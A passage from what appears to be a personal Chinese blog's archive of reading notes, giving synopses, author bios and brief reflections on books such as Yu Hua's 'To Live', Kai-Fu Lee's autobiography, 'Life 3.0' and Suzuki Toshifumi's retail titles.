<li><p>著作首次由俞敏洪亲自完整地讲述创业发展历程，以及其中遇到的诸多团队、管理、与竞争者甚至社会各界的关系等问题，同时进行了自我深度剖析，从信息有效性、逻辑完整性、层次多样性来说，都是一部优秀的作品。</p>
</li>
<li><p>著作以“创业维艰”为视角，初次曝光诸多情景与细节，并揭开被事业成功掩盖的那些困难与困惑，完整度和深度前所未有。</p>
</li>
<li><p>“这里没有高深的理论知识，只有场景和故事。通过场景还原，总结我的经验教训，把故事掰开了、揉碎了、坦诚地与大家讲述我曾遇到的问题，让跟当初的我一样的创业者、年轻朋友，回避掉一些坑，尽可能地获得一些参考，哪怕一点点”，这是俞敏洪的坦诚之言，也是这本书的一个基调，处在各个状态的创业者、需要破局跃迁的管理者、有想法又追求的年轻人、学生群体及家长等，都能从中受益。</p>
</li>
</ol>
<h2 id="【内容介绍】"><a href="#【内容介绍】" class="headerlink" title="【内容介绍】"></a>【内容介绍】</h2><p>这本书是作者俞敏洪第一次完整、深度地讲述新东方从 0 到 1、从 1 到 N 的创业历程，披露了诸多不为人知的细节，让人看到带领着新东方从一个培训班发展成为上市集团的创业者，以及他的团队曾经经过的至暗时刻，甚至曾走到崩溃的边缘。创业维艰，1/4 个世纪的风雨征程，完整地被记录，激荡地再现了新东方创始团队及新东方人，在时代的光辉中砥砺前行的身影。</p>
<p>延着内容主线，“三驾马车”的光阴故事已经留存，新生代的管理团队已在快速发展的互联网时代中开拓进取，搏出广阔天地，而今，人工智能浪潮下，新东方又将向何处进发，仍是新东方故事的待续篇章。</p>
<p>相信这本书，定能让读者在作者个人一贯的幽默叙事方式中，在个人发展、组织建设、企业管理等多个方面受到启发和激励。</p>
<h1 id="作者简介"><a href="#作者简介" class="headerlink" title="作者简介"></a>作者简介</h1><p>俞敏洪<br>1962 年生，江苏江阴人，毕业于北京大学西语系毕业。1985 年至 1991 年任北京大学外语系教师，1993 年创办北京新东方学校，2003 年成立新东方教育科技集团。2006 年 9 月 7 日，带领新东方在美国纽约证券交易所成功上市。现任新东方教育科技集团董事长、北京大学企业家俱乐部理事长、洪泰基金创始合伙人。第十一届、第十二届、第十三届全国政协委员，民盟中央委员，民盟中央教育委员会副主任。</p>
<h1 id="读后感"><a href="#读后感" class="headerlink" title="读后感"></a>读后感</h1><p>这本书真的不错,不仅有励志有公司发展历程中的各种问题的暴露,对有创业打算的人来说有很好的参考价值.<br>公司成长过程中暴露的各种问题,虽然短期内很挣钱但是与公司的经营理念背道而驰,如何决策可能直接影响公司以后的发展。俞敏洪从重视人文，到与科技的结合,业务的扩张也很迅速.从各自为政到集团化统一管理一步步变革很不容易。</p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>活着</title>
    <url>/2019/01/28/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%B4%BB%E7%9D%80/</url>
    <content><![CDATA[<p><img src="/2019/01/28/读书笔记/活着/alive.jpg" alt></p>
<h1 id="作者简介"><a href="#作者简介" class="headerlink" title="作者简介"></a>作者简介</h1><p>余华，1960年出生，1983年开始写作。至今已经出版长篇小说4部，中短篇小说集6部，随笔集4部。主要作品有《兄弟》《活着》《许三观卖血记》《在细雨中呼喊》等。其作品已被翻译成20多种语言在美国、英国、法国、德国、意大利、西班牙、荷兰、瑞典、挪威、希腊、俄罗斯、保加利亚、匈牙利、捷克、塞尔维亚、斯洛伐克、波兰、巴西、以色列、日本、韩国、越南、泰国和印度等国出版。曾获意大利格林扎纳·卡佛文学奖（1998年）、法国文学和艺术骑士勋章（2004年）、中华图书特殊贡献奖（2005年）、法国国际信使外国小说奖（2008年）等。</p>
<h1 id="内容简介"><a href="#内容简介" class="headerlink" title="内容简介"></a>内容简介</h1><p>《活着(新版)》讲述了农村人福贵悲惨的人生遭遇。福贵本是个阔少爷，可他嗜赌如命，终于赌光了家业，一贫如洗。他的父亲被他活活气死，母亲则在穷困中患了重病，福贵前去求药，却在途中被国民党抓去当壮丁。经过几番波折回到家里，才知道母亲早已去世，妻子家珍含辛茹苦地养大两个儿女。此后更加悲惨的命运一次又一次降临到福贵身上，他的妻子、儿女和孙子相继死去，最后只剩福贵和一头老牛相依为命，但老人依旧活着，仿佛比往日更加洒脱与坚强。</p>
<p>《活着(新版)》荣获意大利格林扎纳•卡佛文学奖最高奖项（1998年）、台湾《中国时报》10本好书奖（1994年）、香港“博益”15本好书奖（1994年）、第三届世界华文“冰心文学奖”（2002年），入选香港《亚洲周刊》评选的“20世纪中文小说百年百强”、中国百位批评家和文学编辑评选的“20世纪90年代最有影响的10部作品”。</p>
<h1 id="读后感"><a href="#读后感" class="headerlink" title="读后感"></a>读后感</h1><p>真的是悲剧接踵而至,应接不暇。每次看到转折的时候总是抱有一丝希望,接下来一定会好的。结果总是让人难以接受。丧父母、丧子、丧女、丧妻、丧外孙、丧女婿…. 真是他娘的让人喘不过气来。生活还得继续,不敢生活怎么打击、折磨,只管勇往直前!</p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>嫌疑人X的献身</title>
    <url>/2019/05/20/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E5%AB%8C%E7%96%91%E4%BA%BAX%E7%9A%84%E7%8C%AE%E8%BA%AB/</url>
    <content><![CDATA[<p><img src="/2019/05/20/读书笔记/嫌疑人X的献身/xianyirenx.jpg" alt></p>
<a id="more"></a>
<h1 id="内容简介"><a href="#内容简介" class="headerlink" title="内容简介"></a>内容简介</h1><p>百年一遇的数学天才石神，每天唯一的乐趣，便是去固定的便当店买午餐，只为看一眼在便当店做事的邻居靖子。</p>
<p>靖子与女儿相依为命，失手杀了前来纠缠的前夫。石神提出由他料理善后。石神设了一个匪夷所思的局，令警方始终只能在外围敲敲打打，根本无法与案子沾边。石神究竟使用了什么手法？</p>
<h1 id="作者简介"><a href="#作者简介" class="headerlink" title="作者简介"></a>作者简介</h1><p>东野圭吾，日本著名作家。1958 年生于大阪。1985 年，以第 31 届江户川乱步奖获奖作品《放学后》出道，开始扬名立万。20 年作品逾 60 部，几乎囊括了日本所有大奖，1998 年，《秘密》获第 52 届日本推理作家协会奖，入围第 120 届直木奖；1999 年，《白夜行》入围第 122 届直木奖；2001 年，《暗恋》入围第 125 届直木奖；2003 年，《信》入围第 129 届直木奖。2006 年，《嫌疑人 X 的献身》终于捧得日本文学最高荣誉直木奖。</p>
<p>前期作品多写得精巧细致，随着写作功底浸润日深，尤其是《白夜行》之后，笔锋日渐老辣：文字鲜加雕琢，叙述简练凶狠，情节跌宕诡异，故事架构几至匪夷所思的地步。至巅峰之作《嫌疑人 X 的献身》，叙事与推理，均已炉火纯青：最好的诡计、无懈可击的推理、恰当的伏笔，以及最普通但最不易猜透的悬念，受到大奖评委的莫大青睐，同时获得直木奖和本格推理小说大奖，更受到评论界、媒体和广大读者的如潮好评，创造了日本推理小说史上绝无仅有的奇迹——同时摘得“这本小说了不起”、“本格推理小说 Top 10”、“周刊文艺推理小说 Top 10”三大推理小说排行榜年度总冠军。</p>
<h1 id="读后感"><a href="#读后感" class="headerlink" title="读后感"></a>读后感</h1><p>太优秀,各种推理,物理、化学、数学推理层数不穷…</p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>李开复自传 世界因你不同</title>
    <url>/2019/05/07/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E6%9D%8E%E5%BC%80%E5%A4%8D%E8%87%AA%E4%BC%A0%E4%B8%96%E7%95%8C%E5%9B%A0%E4%BD%A0%E8%80%8C%E4%B8%8D%E5%90%8C/</url>
    <content><![CDATA[<p><img src="/2019/05/07/读书笔记/李开复自传世界因你而不同/likaifu.jpg" alt></p>
<a id="more"></a>
<h1 id="内容简介"><a href="#内容简介" class="headerlink" title="内容简介"></a>内容简介</h1><p>这是李开复唯一的一本自传，字里行间，是岁月流逝中沉淀下来的宝贵的人生智慧和职场经验。捣蛋的“小皇帝”，11 岁的“留学生”，奥巴马的大学同学，26 岁的副教授，33 岁的苹果副总裁，谷歌中国的创始人，他有着太多传奇的经历，为了他，两家最大的 IT 公司对簿公堂。而他的每一次人生选择，都是一次成功的自我超越。</p>
<p>透过这本自传，李开复真诚讲述了他鲜为人知的成长史、风雨兼程的成功史和烛照人生的心灵史，也首次全面披露了他亲历的苹果、微软、谷歌等 IT 巨头风云变幻的内幕。娓娓道来，字字珠玑。</p>
<p>抓住一切去探寻生命的意义，总有一天，世界将因你不同。</p>
<h1 id="作者简介"><a href="#作者简介" class="headerlink" title="作者简介"></a>作者简介</h1><p>李开复，2009 年创立创新工场，一个全方位的创业平台，旨在培育创新人才和新一代高科技企业。曾先后在苹果、SGI、微软、谷歌等公司担任要职，1998 年亲手创办微软中国研究院（后更名为微软亚洲研究院），2000 年就任微软公司全球副总裁，成为比尔·盖茨的七位高层智囊之一。2005 年，加入谷歌公司，任全球副总裁兼大中华区总裁。</p>
<p>祖籍四川，1961 年 12 月生于台湾。11 岁留学美国，1988 年获得卡内基·梅隆大学计算机系博士学位。他开发了全球第一个“不特定语者连续语音识别”系统，被美国《商业周刊》评为 1988 年最重要的科学发明。他开发的“奥赛罗”人机对弈系统，击败了人类世界冠军。他还是美国电气和电子工程师协会院士和精英组织百人会的副会长。</p>
<p>范海涛，毕业于西南政法大学，获文学学士和法学学士。16 岁成为北京市中学生通讯社记者，为《北京青年报》下属报纸《中学生时事报》撰稿。现为《北京青年报》财经新闻记者，2005 年开始专注互联网领域的报道。</p>
<h1 id="读后感"><a href="#读后感" class="headerlink" title="读后感"></a>读后感</h1><p>对李开复对于中西教育方式的比较,中国应试教育和西方兴趣教育的深刻不同印象较深。在公司部门被裁,作为领导者管理者的那种自责、负责的精神让人很感动。<br>其中比较了技术人员和管理者的思维不同,技术人员偏重高智商、对技术的偏执。而管理者则偏重高情商,协调各种资源推动产品落地。重视员工的看法,创业公司对财务预算的评估、管理者对公司理念的把握而不是摆出一副臭架子、坚信科技改变未来等。<br>开复老师心怀教育,对中国教育商业化和中国大学生在前进的路上的迷茫有深刻的印象,每个人都急功近利、在名利场上迷失了自己。<br>对google开放、自由、创新的跨国公司巨头对员工创新性的充分挖掘折服。中国为何不可以?</p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>生命3.0</title>
    <url>/2019/04/22/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E7%94%9F%E5%91%BD3.0/</url>
    <content><![CDATA[<p><img src="/2019/04/22/读书笔记/生命3.0/life.jpg" alt></p>
<a id="more"></a>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>在人工智能崛起的当下,你希望看到一个什么样的未来？当超越人类智慧的人工智能出现时,人类将何去何从？你是否希望我们创造出能自我设计的生命 3.0,并把它散播到宇宙各处？人工智能时代,生而为人的意义究竟是什么？在《生命 3.0》中,麻省理工学院物理系终身教授、未来生命研究所创始人迈克斯·泰格马克将带领我们参与这个时代最重要的对话。</p>
<p>《生命 3.0》一书中,作者迈克斯·泰格马克对人类的终极未来进行了全方位的畅想,从我们能活到的近未来穿行至 1 万年乃至 10 亿年及其以后,从可见的智能潜入不可见的意识,重新定义了“生命”“智能”“目标”“意识”,并澄清了常见的对人工智能的误解,将帮你构建起应对人工智能时代动态的全新思维框架,抓住人类与人工智能共生演化的焦点。</p>
<p>麻省理工学院物理系终身教授、未来生命研究所创始人迈克斯·泰格马克,重磅新作.从 14 岁起,作者就开始关注科技对人类未来的影响,人工智能的突飞猛进,更是加剧了他的担忧,所以在其 45 岁,创立了人工智能界鼎鼎大名的非营利性组织“未来生命研究所”,致力于用科技改善人类的未来。如今,他将带领我们参与这个时代最重要的对话。</p>
<p>与人工智能相伴,人类将迎来…</p>
<h1 id="读后感"><a href="#读后感" class="headerlink" title="读后感"></a>读后感</h1><p>随着大数据、人工智能技术的崛起,在电影中看到的机器人统治地球、机器人想人一样思考、具有感情可能会成为现实。但是人类也要控制人工智能,失控的人工智能可能会统治人类。希望和威胁并存…</p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>零售的哲学</title>
    <url>/2019/06/19/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E9%9B%B6%E5%94%AE%E7%9A%84%E5%93%B2%E5%AD%A6/</url>
    <content><![CDATA[<p><img src="/2019/06/19/读书笔记/零售的哲学/s27882050.jpg" alt></p>
<a id="more"></a>
<h1 id="内容简介"><a href="#内容简介" class="headerlink" title="内容简介"></a>内容简介</h1><p>全球最大的便利店连锁公司创始人——铃木敏文，结合 40 多年零售经验，为你讲述击中消费心理的零售哲学。铃木敏文的很多创新，现在已经成为商界常识，本书把那些不可思议的零售创新娓娓道来。关于零售的一切：选址、订货、销售、物流、管理……他一次又一次地在一片反对声中创造出零售界的新纪录。</p>
<p>翻开本书，看铃木敏文如何领导 7-11 冲破层层阻碍，成为世界第一的零售哲学。</p>
<h1 id="作者简介"><a href="#作者简介" class="headerlink" title="作者简介"></a>作者简介</h1><p>铃木敏文<br>世界级企业家，日本 7-ELEVEN 创办人。他被日本媒体称为继松下幸之助之后的“日本新经营之神”，美国《哈佛商业评论》评价其为“融合东西方管理精神的最佳典范”。他领导的日本最大的零售集团 SEVEN&amp;I 控股公司为全球第四大、亚洲最大的零售王国，营业额约等同日本 GDP 的 1.25％，富可敌国。他曾三次领军企业变革，没有一次失败；而他所建立的“单品管理”概念，甚至让英语世界创造了一个新的名词“Tanpin Kanri”（“单品管理”日文发音）。</p>
<h1 id="读后感"><a href="#读后感" class="headerlink" title="读后感"></a>读后感</h1><p>刚开始读就被作者敏锐、独到的眼光折服.做事脚踏实地的态度在当今（2019 年）这个浮躁的社会大环境中如此难得。不随波逐流、坚持自我、力排众议这些性格特点也为前路的发展有一些利好的影响。<br>看完以后更加佩服日本人对工作、生活认真负责的态度,实干家。而当下中国浮躁的环境下,人人都匆忙的追名逐利,一切向”钱”看,放弃企业、自己的责任…</p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>知乎周刊--人工智能:像人一样思考？</title>
    <url>/2018/06/28/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E7%9F%A5%E4%B9%8E%E5%91%A8%E5%88%8A%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%83%8F%E4%BA%BA%E4%B8%80%E6%A0%B7%E6%80%9D%E8%80%83/</url>
    <content><![CDATA[<p><img src="https://i.imgur.com/bVD2IZr.jpg" alt><br>「人工智能」，这个曾经很遥远很未来的概念，正逐渐在我们的生活中刷遍存在感。有人从中看到了「千亿的未来」，谷歌、Facebook、微软等互联网巨头不惜重金收购人工智能公司，发展人工智能实验室；也有人担心自己所处的行业被人工智能取代，甚至预言更多隐患。而你，又看到了什么？<br>本期周刊，听知乎上的科研人员、从业者和爱好者聊聊人工智能，从可以触摸的真实的现在，看见未来。<br>愿你收获从未知到已知的喜悦。</p>
<blockquote>
<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul>
<li>人工智能：像人一样思考？</li>
<li>电脑和人类的围棋对决</li>
<li>如何看待 Google 围棋 AI AlphaGo 击败欧洲围棋冠军？</li>
<li>围棋作为唯一一种电脑下不赢人的大众棋类，是何原因导致？以及量子计算机出现后有无可能？</li>
<li>如何评价 Nature 重磅封面：谷歌人工智能击败欧洲围棋冠军，3 月将与李世乭对弈？</li>
<li>通往超级智能之路</li>
<li>为什么最近有很多名人，比如比尔盖茨、马斯克、霍金等，让人们警惕人工智能？</li>
<li>神经网络是什么</li>
<li>如何简单形象又有趣地讲解神经网络是什么？</li>
<li>机器人有没有变厉害，要看你怎么定义</li>
<li>为什么机器人研究了几十年，还是给人感觉没有太大进展？</li>
<li>未来，司机会被取代吗？</li>
<li>Google 无人驾驶汽车的发布意味着什么？</li>
<li>谷歌智能车的难点在哪里？模式识别，还是分析、控制算法？</li>
<li>人工智能可以作曲吗？</li>
<li>机器人如何影响着设计产业</li>
<li>机器人对设计学科（包括建筑学）有什么影响？</li>
<li>自动驾驶时代，人可以做什么？</li>
<li>自动驾驶技术日渐成熟的背景下会带来哪些创业机会？</li>
<li>人类的智能是好的智能吗？</li>
<li>人类的智能是一个好的智能吗？</li>
<li>研究人工智能会让我们更了解自己吗？</li>
<li>对机器人或人工智能的研究会帮助我们更好地了解人类自己吗？</li>
</ul>
<h1 id="读后感"><a href="#读后感" class="headerlink" title="读后感"></a>读后感</h1><p>对人工智能有部分理解,背后的数学、统计学知识异常丰富。感叹于科技的力量,自动驾驶、模式识别、人脸识别、机器人等等…<br>知道了部分算法、概念,蒙特卡罗算法、隐马尔可夫随机场、决策树等等.把数学知识学习一下,准备试水深度学习…</p>
</blockquote>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>颠覆者：周鸿祎自传</title>
    <url>/2019/05/05/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E9%A2%A0%E8%A6%86%E8%80%85%E5%91%A8%E9%B8%BF%E7%A5%8E%E8%87%AA%E4%BC%A0/</url>
    <content><![CDATA[<p><img src="/2019/05/05/读书笔记/颠覆者周鸿祎自传/s29615583.jpg" alt><br><a id="more"></a></p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>周鸿祎，一个在中国互联网历史上举足轻重的名字。他被认为是奠定当今中国互联网格局的人之一。</p>
<p>作为第一代互联网人，中国互联网行业最好的产品经理、创业者，他每时每刻都以自己的实践，为互联网的发展贡献自己的力量。</p>
<p>在很长一段时间内，他没有在公共场合发声，甚至有粉丝对当前死水一潭的互联网现状不满意，发出了“人民想念周鸿祎”的呼声。</p>
<p>但周鸿祎在小时候，却是一个踢天弄井，动不动就大闹天宫的超级熊孩子，一个成年人眼里的非主流儿童。</p>
<p>小时候周鸿祎在家里经常因为捅出娄子，惹来父母一顿揍。上学之后，更是一个调皮捣蛋的异类分子——上课说话、做小动作、戏弄女同学、画漫画丑化惩罚他的老师，甚至因为淘气被警察找上门来。</p>
<p>岁月会让人变得成熟稳重，然而上大学之后的周鸿祎，却也不怎么安分——刚上大学就跟人打架，差点被开除、多次创业失败……</p>
<p>在“熊孩子”背后，周鸿祎还有另外一面：他从小就热爱阅读，时至今日仍然保持着阅读的好习惯，不断升级迭代自己的思维体系；他高中时期就立下了“活着就是为了改变世界”的志向，要做一款产品改变世界；大学期间创业虽然失败，但没有击倒他，反而更坚定了他做好产品，服务好用户的理想。</p>
<p>一个调皮捣蛋四处惹祸的“超级熊孩子”，一个颠覆式的挑战者，经过二十年坚持不懈的努力奋斗，凭借着对计算机的无限热爱，蜕变为了人尽皆知的“互联网英雄”。</p>
<p>周鸿祎这个四十年走过的路，一点都没有枉顾时间给他所有的考验和历练。</p>
<p>不甘于平庸的你，读完周鸿祎的成长故事，也可以得到一些启迪，从而颠覆观念，颠覆人生。</p>
<h1 id="读后感"><a href="#读后感" class="headerlink" title="读后感"></a>读后感</h1><p>虽然或多或少用过360,但对360的过去并不太知道。以及大家口耳相传的流氓公司3721.看了“红衣大炮”的这本自传, 对360以及周鸿祎本人有了一个更新的认识。周鸿祎年少时对计算机的热情、专注、不妥协、不放弃这些独立人格造就了3721以及后来的奇虎360。在互联网风起云涌时代对产品的专注,对用户的负责也造就了360。对互联网创业者也是一个启示吧,创业九死一生,惊心动魄,踏上这条路希望有所帮助,在惊涛骇浪中砥砺前行！</p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>鱼羊野史</title>
    <url>/2019/07/15/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E9%B1%BC%E7%BE%8A%E9%87%8E%E5%8F%B2/</url>
    <content><![CDATA[<p><img src="/2019/07/15/读书笔记/鱼羊野史/s29244684.jpg" alt></p>
<a id="more"></a>
<h1 id="内容简介"><a href="#内容简介" class="headerlink" title="内容简介"></a>内容简介</h1><p>《鱼羊野史(1-6 卷)(套装共 6 册)》是东方卫视脱口秀节目《晓松说——历史上的今天》未删节版完整收录的超级读本。</p>
<p>《鱼羊野史》讲述每一天在历史上发生的大事件或有趣的事，以高晓松的角度来重新解读历史事件，风格轻松幽默，与严肃的讲历史的不同，有很多高晓松个人见解和趣闻，重温故国、故城、故人芳华刹那。</p>
<h1 id="作者简介"><a href="#作者简介" class="headerlink" title="作者简介"></a>作者简介</h1><p>高晓松，中国著名音乐制作人、电影导演、词曲创作者、写字者，阿里音乐集团董事长。</p>
<p>代表作品：</p>
<p>音乐作品</p>
<p>《同桌的你》《恋恋风尘》《万物生》《彼得堡遗书》</p>
<p>《校园民谣》作品集、《青春无悔》作品集、《万物生长》作品集</p>
<p>电影作品</p>
<p>《那时花开》《我心飞翔》《大武生》《同桌的你》</p>
<p>文学作品</p>
<p>《写在墙上的脸》《如丧：我们终于老得可以谈谈未来》“晓说”系列</p>
<h1 id="读后感"><a href="#读后感" class="headerlink" title="读后感"></a>读后感</h1><p>读了第四卷,感觉高晓松挺渊博也挺八卦的,当趣闻看了…</p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>零售心理战</title>
    <url>/2019/07/04/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E9%9B%B6%E5%94%AE%E5%BF%83%E7%90%86%E6%88%98/</url>
    <content><![CDATA[<p><img src="/2019/07/04/读书笔记/零售心理战/s28064803.jpg" alt></p>
<a id="more"></a>
<h1 id="内容简介"><a href="#内容简介" class="headerlink" title="内容简介"></a>内容简介</h1><p>全球最大便利店连锁公司 7-Eleven 的创始人——铃木敏文，结合 40 多年的零售经验，为您讲述洞察顾客心理的成功秘诀：</p>
<p>一、不要为顾客着想，而是要站在顾客的立场上思考</p>
<p>虽然这两个概念看似大同小异，但“为顾客着想”终究是站在卖方的立场，脱离了普通消费者的生活；而“站在顾客立场”思考则跳出了“业内人士”的思维定势和经验框架，更易找到消费者的真实需求。</p>
<p>二、购买需要理由</p>
<p>顾客并非不愿意购买，他们只是在为自己的购买行为寻找一个合理理由。当顾客从一个产品中看到了能满足自己需求的购买理由时，就必然会购买。</p>
<p>三、持续给予顾客“附加值”</p>
<p>顾客总是在追求有附加价值的产品。因此作为卖方，我们必须持续给予顾客附加值，以满足顾客不断改变的需求。当卖方放弃思考与努力，不再拓展产品或服务价值的广度时，顾客的忠诚度也会随之一落千丈。</p>
<p>四、任何人离开工作，都是一名普通的消费者</p>
<p>在工作时，人们往往会不自觉地从公司或某些冠冕堂皇的角度看待问题。但其实，任何人离开工作，都是一名普通的消费者。只要回归平常的生活，就不难领会消费者的内心。答案在顾客内心的同时，也藏在“自己”的心中。</p>
<p>通过引述日本各行业一线成功人士——包括 AKB48 制作人秋元康、优衣库品牌设计师佐藤可士和、JR 东日本 Ecute 创始人镰田由美子等人的经营理念及案例，铃木敏文将为您献上一系列最经典、最全面、最实用、最通俗易懂的零售心理战策略。</p>
<h1 id="作者简介"><a href="#作者简介" class="headerlink" title="作者简介"></a>作者简介</h1><p>铃木敏文，世界级企业家，日本 7-ELEVEN 创办人。他被日本媒体称为继松下幸之助之后的“日本新经营之神”，美国《哈佛商业评论》评价其为“融合东西方管理精神的最佳典范”。他领导的日本最大的零售集团 SEVEN&amp;I 控股公司为全球第四大、亚洲最大的零售王国，营业额约等同日本 GDP 的 1.25％，富可敌国。</p>
<h1 id="读后感"><a href="#读后感" class="headerlink" title="读后感"></a>读后感</h1><p>消费心理确认很重要,抓住消费者的心理可以在一定程度上提高营业额.随着消费水平的提高,一味的打价格战反而会适得其反,低价策略并一定适合所有消费者。消费者失去东西要比得到东西更加刻骨铭心。合理的定价策略也对营业额有一定的促进作用…一句话,满足消费者的需求才是生存发展的基础。</p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>八堂极简科学课</title>
    <url>/2018/06/23/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E5%85%AB%E5%A0%82%E6%9E%81%E7%AE%80%E7%A7%91%E5%AD%A6%E8%AF%BE/</url>
    <content><![CDATA[<p><img src="https://i.imgur.com/gjeW8ch.jpg" alt><br><a href="https://book.douban.com/subject/27134534/" target="_blank" rel="noopener">八堂极简科学课</a> 作者: 本•米勒 (Ben Miller) </p>
<blockquote>
<h1 id="内容简介"><a href="#内容简介" class="headerlink" title="内容简介"></a>内容简介</h1><p>本•米勒用轻松幽默的语言，引领读者走进奇妙的科学世界，汇成人人都看得懂、都爱看的八堂极简科学课——DNA造物密码、黑洞之谜、宇宙大爆炸、美食的奥秘美拉德反应、探索外星人等。作者以兴趣为导向，将众多耳熟能详又知之甚少的重大科学理论娓娓道来，为读者展开一段段妙趣横生的科学史话。没有拗口的术语和枯燥的论证，只有诙谐的叙述和生动的比喻，带你轻松越过重重障碍，感受科学之美！</p>
<h1 id="作者简介"><a href="#作者简介" class="headerlink" title="作者简介"></a>作者简介</h1><p>本•米勒（Ben Miller）<br>狂热的科学爱好者，曾于剑桥大学攻读物理学博士，英国《泰晤士报》科学专栏作家，BBC喜剧明星，“憨豆特工”搭档演员，国际知名导演、编剧和制片人，曾获第63届英国电影和电视艺术学院奖等多项大奖。米勒结合科学与艺术两种卓越的能力和天赋，用轻松幽默的语言，理清深奥难懂的科学术语和理论，同时又不失科学的权威。还著有《外星人来了！》等科普书。</p>
<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h3 id="第1课-趣味科学初体验"><a href="#第1课-趣味科学初体验" class="headerlink" title="第1课 趣味科学初体验"></a>第1课 趣味科学初体验</h3><p>1 人真的是由星尘组成的<br>3 好玩的数学<br>9 科学世界是懒人创造的<br>11 从一道剑桥大学入学面试题说起<br>12 量子效应能吸引你整夜泡在实验室<br>14 让霍金开怀大笑的科学脱口秀<br>17 抛开基础知识，从有趣的科学讲起</p>
<h3 id="第二课-量子物理世界的奥秘"><a href="#第二课-量子物理世界的奥秘" class="headerlink" title="第二课 量子物理世界的奥秘"></a>第二课 量子物理世界的奥秘</h3><p>21 你的所有一切都由夸克组成<br>22 令人振奋的大型强子对撞机<br>24 目睹世界最大的科学实验中枢<br>25 寻找上帝粒子<br>28 对撞机的把戏——把能量转换成物质<br>30 大型强子对撞机能制造出黑洞？<br>31 宇宙射线的震撼能量<br>33 如何分辨伪科学<br>35 奇异又美妙的黑洞<br>37 场论与玄论之争<br>38 规范场论要有例子证明<br>39 弦理论寻找N维时空<br>41 反物质和大爆炸<br>42 正物质与反物质，天使与魔鬼<br>44 婴儿宇宙是些团块<br>45 宇宙未解之谜</p>
<h3 id="第三课-广义相对论的宇宙和时空"><a href="#第三课-广义相对论的宇宙和时空" class="headerlink" title="第三课 广义相对论的宇宙和时空"></a>第三课 广义相对论的宇宙和时空</h3><p>47 谁都可以参与的“观星派对”<br>48 迈出天文学的第1步<br>49 夜里最容易看到的三颗行星<br>51 夜空甜点——卫星、流星和彗星<br>52 饱览太阳系的焰火表演<br>53 你杯子里的水可能来自火星<br>54 来自遥远星球的消息<br>55 你不知道的十二星座<br>57 婴儿恒星是这样诞生的<br>57 独具特色的蓝、白、红色三颗恒星<br>59 红矮星“隐身”之谜<br>60 教你准确找到恒星<br>62 蓝色恒星都是大块头<br>63 超级恒星的悲惨命运<br>64 X光谱<br>66 天鹅的黑暗之心<br>67 我们在银河系的盘子里<br>69 自学成才的天文望远镜之父<br>71 夜空为什么是黑的而不是白的<br>72 爱因斯坦的时运<br>73 相对论用于处理大事物<br>73 广义相对论的理论基础<br>74 时空转换<br>76 空间是所有一切的驱动力<br>77 我们正掉进黑洞里<br>78 亲临一次末日之旅吧<br>80 与成功的理论交手</p>
<h3 id="第四课-生命源起和进化论"><a href="#第四课-生命源起和进化论" class="headerlink" title="第四课 生命源起和进化论"></a>第四课 生命源起和进化论</h3><p>81 友善对待外星人<br>82 理论，假说和预感<br>83 物种起源游戏<br>86 新物种更能适应新环境<br>87 进化论与适应能力<br>88 进化论的由来<br>89 良好的遗传基因<br>91 具有革命性的理论<br>92 石头说出的真相<br>93 一切都在循环之中<br>94 岩石也在不停循环<br>96 花岗岩上的故事<br>98 成为化石好艰难<br>99 你的祖先是条鱼<br>101 我们来得太迟了<br>103 解开自身起源的秘密<br>106 奥妙都在基因之中</p>
<h3 id="第五章-揭开DNA的造物密码"><a href="#第五章-揭开DNA的造物密码" class="headerlink" title="第五章 揭开DNA的造物密码"></a>第五章 揭开DNA的造物密码</h3><p>109 携带信息的DNA<br>111 蛋白质，生命存活的关键<br>113 绘制基因组<br>115 线粒体夏娃和Y染色体亚当<br>117 伟大的线粒体<br>117 黑猩猩时钟<br>119 回到伊甸园<br>120 性别战争<br>122 异时空之恋<br>123 转基因的优势——基因变异带来的好处<br>126 乳糖酶的作用<br>127 乳糖酶基因LCT的奥秘<br>130 基因组的语言</p>
